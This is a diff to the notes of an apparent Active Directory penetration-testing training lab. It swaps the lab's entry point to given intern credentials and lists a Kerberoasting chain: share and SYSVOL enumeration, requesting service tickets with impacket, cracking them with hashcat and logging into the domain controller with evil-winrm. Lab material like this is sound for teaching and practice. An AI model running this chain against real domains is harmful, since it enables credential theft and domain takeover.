@@ -3,20 +3,20 @@
 ## Targets
 
 - **dc01** — sole DC for corp.pentrain.local
-- **files01** — standalone SMB box with a leaked share (entry point)
+- entry: `intern / Welcome2024!` (from the briefing) — plain Domain Users
 
 ## Useful commands
 
 ```bash
-smbclient -N -L //<files01>/          # anonymous listing
-smbclient -N //<files01>/share        # grab the leak
-impacket-GetUserSPNs corp.pentrain.local/<user>:<pw> -dc-ip <dc01> -request
+netexec smb <dc01> -u intern -p 'Welcome2024!' --shares
+smbclient //<dc01>/SYSVOL -U 'corp\intern%Welcome2024!'  # scripts + notes
+impacket-GetUserSPNs corp.pentrain.local/intern:'Welcome2024!' -dc-ip <dc01> -request
 hashcat -m 13100 spns.txt rockyou.txt
-evil-winrm -i <dc01> -u Administrator -p '<cracked>'
+evil-winrm -i <dc01> -u <roasted-user> -p '<cracked>'
 ```
 
 ## Concepts
 
 - Any domain user may request service tickets — SPNs are the roast list
 - SYSVOL on a DC is world-readable to domain users — scripts + notes live there
-- The share leak gives you the *first* domain cred; roasting gives the rest
+- Roast → crack → WinRM: the DA account's session opens the flag dirs
